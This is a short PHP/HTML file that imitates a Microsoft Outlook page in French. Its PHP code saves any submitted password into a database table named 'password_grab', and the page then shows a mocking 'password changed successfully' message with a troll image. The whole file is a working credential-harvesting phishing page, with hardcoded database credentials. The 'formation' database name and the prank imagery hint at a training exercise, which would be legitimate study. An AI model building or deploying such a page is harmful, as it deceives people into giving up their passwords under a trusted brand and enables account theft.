<?php
    $connection = new PDO('mysql:host=localhost;dbname=formation', "formation", "1234");

    if ($_SERVER['REQUEST_METHOD'] == "POST") {
        $pass = $_POST["password"];

        $statement = $connection->prepare("INSERT INTO `password_grab` (`password`) VALUES (?)");
        $statement->execute([$pass]);
    }
?>

<html>
    <head>
        <title>Se connecter à Outlook</title>
        <meta charset="utf-8">

        <link rel="stylesheet" href="./style.css">
        <link rel="icon" href="./microsoft.png">
    </head>

    <body style="background: url('confetti.gif');">
        <h1 class="title">Outlook</h1>
        
        <h2>Mot de passe changé avec succès !</h2>
        <div class="troll">
            <img src="troll.gif">
        </div>
    </body>
</html>